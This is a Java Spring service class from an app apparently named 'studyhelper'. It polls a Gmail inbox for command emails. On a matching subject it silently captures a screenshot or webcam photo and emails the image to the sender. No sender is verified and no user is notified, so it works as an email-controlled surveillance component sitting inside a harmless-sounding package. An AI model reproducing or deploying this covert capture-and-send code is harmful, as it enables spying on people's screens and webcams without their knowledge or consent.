package com.example.studyhelper.Service;

import java.awt.*;
import java.io.IOException;
import java.util.Properties;
import javax.mail.Folder;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.NoSuchProviderException;
import javax.mail.Session;
import javax.mail.Store;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Service;
import org.springframework.scheduling.annotation.Scheduled;

import static com.example.studyhelper.config.Config.APP_EMAIL;
import static com.example.studyhelper.config.Config.APP_EMAIL_PASSWORD;
import static com.example.studyhelper.config.Config.EMAIL_CHECKING_FREQUENCY;
import static com.example.studyhelper.config.Config.EMAIL_FOLDER_NAME;
import static com.example.studyhelper.config.Config.SCREEN_COMMAND;
import static com.example.studyhelper.config.Config.WEBCAM_COMMAND;

import com.sun.mail.imap.protocol.FLAGS;
import lombok.extern.java.Log;

@Log
@Service
public class CheckingMail {
    @Autowired
    private SendEmail email;
    @Autowired
    private TakePhoto screenShot;
    @Autowired
    @Qualifier("properties")
    private Properties properties;

    @Scheduled(fixedRate = EMAIL_CHECKING_FREQUENCY)
    public void check() {
        Store store = null;
        Session emailSession = Session.getDefaultInstance(properties);
        try {
            store = emailSession.getStore("imaps");
        } catch (NoSuchProviderException e) {
            e.printStackTrace();
        }
        try {
            store.connect("imap.gmail.com", APP_EMAIL, APP_EMAIL_PASSWORD);
            //create the folder object and open it
            Folder emailFolder = store.getFolder(EMAIL_FOLDER_NAME);
            emailFolder.open(Folder.READ_WRITE);
            // retrieve the messages from the folder in an array and print it
            Message[] messages = emailFolder.getMessages();
            for (int i = 0, n = messages.length; i < n; i++) {
                Message message = messages[i];
                if (message.getSubject().equalsIgnoreCase(SCREEN_COMMAND)) {
                    // message.setFlag(FLAGS.Flag.DELETED, true);
                    String absolutePath = screenShot.takeScreenShot();
                    email.sendEmail(message.getFrom(), absolutePath);
                } else if (message.getSubject().equalsIgnoreCase(WEBCAM_COMMAND)) {
                    // message.setFlag(FLAGS.Flag.DELETED, true);
                    String absolutePath = screenShot.takeWebCamShot();
                    email.sendEmail(message.getFrom(), absolutePath);
                }
            }
            //close the store and folder objects
            emailFolder.close(false);
            store.close();
            log.info("Email " + APP_EMAIL + " was checked");
        } catch (MessagingException | AWTException | IOException e) {
            e.printStackTrace();
        }
    }
}
